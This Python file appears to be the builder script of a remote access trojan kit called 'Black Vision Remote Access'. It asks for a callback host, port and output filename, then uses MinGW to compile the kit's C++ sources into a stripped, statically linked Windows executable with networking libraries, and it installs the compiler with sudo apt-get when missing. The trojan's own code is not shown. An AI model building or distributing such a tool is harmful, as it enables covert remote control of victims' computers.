import os
import colorama
from shutil import which

colorama.init()
def banner():
    banner_one =  colorama.Fore.LIGHTGREEN_EX + r"""
    ____________________________
    _Black Vision Remote Access_    
     |           ~            |                    
    """ + colorama.Style.RESET_ALL

    return banner_one

def clear():
    if(os.name == "nt"):
        os.system("cls")
    else:
        os.system("clear")

def generate():

    def mingw_check(path):
        print("[~] Checking if mingw compiler is installed.")
        p = which(path)
        if(p):
            print("[+] Found " + str(p))
            return True
        else :
            print("[-] Not Installed.")
            return False

    if(os.name == "nt"):
        if(mingw_check("g++") == True):
            print("[+] Generating Executable..")
            host = input("[?] Enter Host : ")
            port = input("[?] Enter Port : ")
            filename = input("[?] Filename : ")
            # First Change Host and Port then continue
            wincmd = "g++ main.cpp blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
            os.system(wincmd)
        else :
            print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
    else:
        if(mingw_check("i686-w64-mingw32-g++") == True):
            print("[+] Generating Executable..")
            host = input("[?] Enter Host : ")
            port = input("[?] Enter Port : ")
            filename = input("[?] Filename : ")
            # Change Host port then continue
            cmd = "i686-w64-mingw32-g++ main.cpp blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
            os.system(cmd)

        else:
            print("[+] Attempting to Install mingw..")
            os.system("sudo apt-get install mingw-w64")

